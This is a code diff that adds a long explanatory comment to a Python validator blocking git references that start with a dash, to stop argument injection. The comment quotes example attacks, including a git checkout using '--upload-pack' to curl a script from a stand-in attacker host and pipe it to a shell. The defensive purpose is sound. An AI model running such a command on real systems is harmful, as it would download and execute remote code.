@@ -114,8 +114,24 @@ def validate_git_reference(ref: str, ref_type: str = "reference") -> str:
     if not sanitized:
         raise ValueError(f"Git {ref_type} cannot be empty after sanitization")
 
+    # 🛡️ AI ASSISTANT PATTERN: Git Argument Injection Prevention
     # CRITICAL SECURITY: Prevent argument injection by blocking leading dashes
-    # This prevents attacks like "--upload-pack=malicious" or "-q --exec=evil"
+    #
+    # What is Argument Injection?
+    # - Attack where user input is treated as command-line flags instead of data
+    # - Example: branch name "--upload-pack=evil.sh" becomes a git flag
+    # - Result: Remote Code Execution (RCE) by executing arbitrary commands
+    #
+    # Real Attack Examples:
+    # - git checkout "--upload-pack=curl http://evil.com/payload.sh|sh"
+    # - git clone "-u /tmp/evil.sh" (uses -u flag for upload-pack)
+    # - git log "-n 999999999" (DoS via resource exhaustion)
+    #
+    # The Fix:
+    # - Block ANY input starting with dash (-)
+    # - Use "--" separator to mark end of flags (defense-in-depth)
+    #
+    # When working with git operations, ALWAYS validate references don't start with dashes!
     if sanitized.startswith('-'):
         raise ValueError(f"Git {ref_type} cannot start with dash (-) to prevent argument injection")
 
